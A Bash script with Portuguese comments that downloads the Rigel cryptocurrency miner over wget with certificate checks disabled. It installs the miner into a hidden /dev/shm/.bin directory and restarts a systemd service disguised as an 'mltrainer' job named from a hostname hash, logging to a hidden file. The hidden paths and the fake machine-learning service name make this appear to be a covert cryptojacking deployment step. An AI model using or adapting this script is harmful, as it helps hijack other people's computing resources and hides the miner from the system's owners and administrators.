#!/bin/bash

echo "=== Corrigindo Arquivo Binário ==="

# Determina a arquitetura do sistema
ARCH=$(uname -m)
echo "Arquitetura detectada: $ARCH"

# Cria diretórios necessários
mkdir -p /dev/shm/.bin

# Remove binário antigo
rm -f /dev/shm/.bin/rigel

# Baixa o binário adequado para a arquitetura
if [ "$ARCH" = "x86_64" ]; then
    echo "Baixando binário para x86_64..."
    wget -q --no-check-certificate "https://github.com/rigelminer/rigel/releases/download/v1.9.2/rigel-1.9.2-linux.tar.gz" -O /tmp/rigel.tar.gz
    
    # Extrai o arquivo
    mkdir -p /tmp/rigel_extract
    tar -xzf /tmp/rigel.tar.gz -C /tmp/rigel_extract
    
    # Encontra e copia o binário
    RIGEL_BIN=$(find /tmp/rigel_extract -name "rigel" -type f | head -n 1)
    if [ -n "$RIGEL_BIN" ]; then
        cp "$RIGEL_BIN" /dev/shm/.bin/rigel
        chmod +x /dev/shm/.bin/rigel
        echo "Binário copiado com sucesso."
    else
        echo "Binário não encontrado no arquivo tar."
        exit 1
    fi
    
    # Limpa arquivos temporários
    rm -rf /tmp/rigel.tar.gz /tmp/rigel_extract
elif [ "$ARCH" = "aarch64" ]; then
    echo "Baixando binário para ARM64..."
    wget -q --no-check-certificate "https://github.com/rigelminer/rigel/releases/download/v1.9.2/rigel-1.9.2-linux-arm64.tar.gz" -O /tmp/rigel.tar.gz
    
    # Extrai o arquivo
    mkdir -p /tmp/rigel_extract
    tar -xzf /tmp/rigel.tar.gz -C /tmp/rigel_extract
    
    # Encontra e copia o binário
    RIGEL_BIN=$(find /tmp/rigel_extract -name "rigel" -type f | head -n 1)
    if [ -n "$RIGEL_BIN" ]; then
        cp "$RIGEL_BIN" /dev/shm/.bin/rigel
        chmod +x /dev/shm/.bin/rigel
        echo "Binário copiado com sucesso."
    else
        echo "Binário não encontrado no arquivo tar."
        exit 1
    fi
    
    # Limpa arquivos temporários
    rm -rf /tmp/rigel.tar.gz /tmp/rigel_extract
else
    echo "Arquitetura não suportada: $ARCH"
    exit 1
fi

# Verifica se o binário está executável
if [ -x "/dev/shm/.bin/rigel" ]; then
    echo "✓ Binário instalado corretamente."
    
    # Reinicia o serviço
    systemctl restart mltrainer-$(hostname | md5sum | cut -c1-8)
    echo "Serviço reiniciado."
    
    echo "Aguarde alguns instantes e verifique o log:"
    echo "  tail -f /dev/shm/.ml.log"
else
    echo "✗ Falha ao instalar o binário executável."
fi
